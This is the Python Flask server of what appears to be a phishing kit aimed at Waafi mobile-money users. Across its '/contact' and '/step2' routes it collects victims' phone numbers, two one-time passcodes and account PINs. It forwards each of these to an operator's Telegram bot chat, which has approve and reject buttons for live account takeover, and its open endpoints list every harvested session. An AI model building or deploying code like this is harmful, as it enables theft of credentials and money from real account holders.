from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import requests
import os
from dotenv import load_dotenv

from sessions import (
    create_session,
    get_session,
    save_step2,
    update_status,
    get_all_sessions
)

load_dotenv()

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")


@app.route("/")
def home():
    return "Waafi API Running"


# ----------------------------
# STEP 1
# ----------------------------
@app.route("/contact", methods=["POST"])
def contact():

    data = request.json

    phone = data.get("phone")
    demo_code = data.get("code")

    session_id = create_session(phone, demo_code)

    message = f"""
🔔 New Application Request

📱 Phone Number:
{phone}

📝 OTP1:
{demo_code}

🆔 Session ID:
{session_id}

Status:
⏳ Pending Review
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    keyboard = {
        "inline_keyboard": [
            [
                {
                    "text": "✅ Approve",
                    "callback_data": f"approve_{session_id}"
                },
                {
                    "text": "❌ Reject",
                    "callback_data": f"reject_{session_id}"
                }
            ]
        ]
    }


    requests.post(
        url,
        data={
            "chat_id": ADMIN_ID,
            "text": message,
            "reply_markup": json.dumps(keyboard)
        }
    )

    return jsonify({
        "status": "success",
        "session_id": session_id
    })

# STEP 2
# ----------------------------
@app.route("/step2", methods=["POST"])
def step2():

    data = request.json

    session_id = data.get("session_id")
    Waafi_pin = data.get("waafi_pin")
    otp2 = data.get("otp2")

    save_step2(session_id, Waafi_pin, otp2)

    message = f"""
🔔 Second Step Received

📝 Otp2:
{otp2}

📌 WAAFI PIN:
{Waafi_pin}

🆔 Session ID:
{session_id}

Status:
⏳ Pending Review
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    requests.post(
        url,
        data={
            "chat_id": ADMIN_ID,
            "text": message
        }
    )

    return jsonify({
        "status": "success",
        "session_id": session_id
    })
# ----------------------------
# approve
@app.route("/approve/<session_id>")
def approve(session_id):

    result = update_status(session_id, "approved")

    if result:

        session = get_session(session_id)

        phone = session["data"]["phone"]
        otp1 = session["data"]["otp1"]

        demo_pin = session["data"].get("step2", {}).get("demo_pin", "Not entered")
        otp2 = session["data"].get("step2", {}).get("otp2", "Not entered")

        message = f"""
✅ APPLICATION APPROVED

📱 Phone:
{phone}

📝 OTP1:
{otp1}

🔐 Demo PIN:
{demo_pin}

📝 OTP2:
{otp2}

🆔 Session ID:
{session_id}

Status:
✅ APPROVED
"""

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        requests.post(
            url,
            data={
                "chat_id": ADMIN_ID,
                "text": message
            }
        )

        return jsonify({
            "status": "approved",
            "session_id": session_id
        })

    return jsonify({
        "error": "Session not found"
    }), 404
# ----------------------------
# REJECT
# ----------------------------
@app.route("/reject/<session_id>")
def reject(session_id):

    result = update_status(session_id, "rejected")

    if result:

        session = get_session(session_id)

        phone = session["data"]["phone"]
        otp1 = session["data"]["otp1"]

        demo_pin = session["data"].get("step2", {}).get("demo_pin", "Not entered")
        otp2 = session["data"].get("step2", {}).get("otp2", "Not entered")

        message = f"""
❌ APPLICATION REJECTED

📱 Phone:
{phone}

📝 OTP1:
{otp1}

🔐 Demo PIN:
{demo_pin}

📝 OTP2:
{otp2}

🆔 Session ID:
{session_id}

Status:
❌ REJECTED
"""

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        requests.post(
            url,
            data={
                "chat_id": ADMIN_ID,
                "text": message
            }
        )

        return jsonify({
            "status": "rejected",
            "session_id": session_id
        })

    return jsonify({
        "error": "Session not found"
    }), 404
# ----------------------------
# CHECK SESSION
# ----------------------------
@app.route("/session/<session_id>")
def session(session_id):

    s = get_session(session_id)

    if not s:
        return jsonify({
            "error": "Session not found"
        }), 404

    return jsonify(s)
    # ----------------------------
# ALL APPLICATIONS
# ----------------------------
@app.route("/applications")
def applications():

    return jsonify(get_all_sessions())


@app.route("/telegram", methods=["POST"])
def telegram_webhook():

    data = request.json

    print("Telegram Update:")
    print(data)

    return "OK"


if __name__ == "__main__":
    app.run()
